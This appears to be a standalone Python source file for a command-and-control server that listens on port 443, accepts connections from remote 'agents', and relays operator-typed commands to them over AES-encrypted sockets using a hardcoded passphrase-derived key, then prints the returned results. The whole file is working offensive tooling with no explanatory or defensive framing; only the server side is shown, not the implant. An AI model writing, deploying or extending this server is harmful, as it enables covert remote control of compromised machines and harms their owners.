import socket
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 443
BUFFER_SIZE = 4096
SECRET_KEY = hashlib.sha256(b'MySecretPassphrase').digest()  # 32-byte key


class C2Server:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((SERVER_HOST, SERVER_PORT))
        self.clients = {}
        self.lock = threading.Lock()

    def encrypt(self, data):
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        return cipher.iv + ct_bytes

    def decrypt(self, data):
        iv, ct = data[:16], data[16:]
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()

    def handle_client(self, client_socket, addr):
        print(f"[+] Agent connected from {addr}")
        try:
            # Wait for initial connection (check_in)
            encrypted_data = client_socket.recv(BUFFER_SIZE)
            if encrypted_data:
                init_msg = self.decrypt(encrypted_data)
                print(f"Initial message: {init_msg}")

            # COMMAND LOOP
            while True:
                # Get command from operator
                command = input(f"c2@{addr}> ").strip()

                if not command:
                    continue

                # Send command to agent
                client_socket.send(self.encrypt(command))

                # Exit command - break loop and close connection
                if command.lower() == "exit":
                    break  # Exit loop

                # Receive and display result
                encrypted_result = client_socket.recv(BUFFER_SIZE)
                if not encrypted_result:
                    break

                result = self.decrypt(encrypted_result)
                print(f"{result}\n")

        except Exception as e:
            print(f"Error: {e}")
        finally:
            # Close connection DEFINITELY
            client_socket.close()
            print(f"[-] Agent {addr} disconnected")
            return  # Completely terminate client handling

    def start(self):
        self.sock.listen(5)
        print(f"[*] C2 listening on {SERVER_HOST}:{SERVER_PORT}")
        while True:
            client_socket, addr = self.sock.accept()
            client_thread = threading.Thread(
                target=self.handle_client,
                args=(client_socket, addr),
                daemon=True
            )
            client_thread.start()


if __name__ == "__main__":
    server = C2Server()
    server.start()